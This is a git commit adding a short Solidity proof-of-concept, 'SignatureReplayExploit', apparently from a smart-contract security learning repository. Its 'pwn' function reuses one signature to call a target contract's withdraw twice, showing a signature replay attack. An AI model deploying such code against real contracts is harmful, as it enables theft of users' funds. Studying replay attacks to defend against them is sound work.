1c5b8651361915968dbfe432fb2e6476b9bfa219
alexursol2 <103754814+alexursol2@users.noreply.github.com>
2024-03-09 12:59:51 +0100

    Update Signature_Replay_Attack.sol

--- Security/Signature_Replay_Attack.sol
+++ Security/Signature_Replay_Attack.sol
@@ -1,1 +1,23 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
 
+interface ISignatureReplay {
+    function withdraw(address to, uint256 amount, bytes32 r, bytes32 s, uint8 v)
+        external;
+}
+
+contract SignatureReplayExploit {
+    ISignatureReplay immutable target;
+
+    constructor(address _target) {
+        target = ISignatureReplay(_target);
+    }
+
+    receive() external payable {}
+
+    function pwn(bytes32 r, bytes32 s, uint8 v) external {
+        target.withdraw(msg.sender, 1e18, r, s, v);
+        target.withdraw(msg.sender, 1e18, r, s, v);
+    }
+
+}
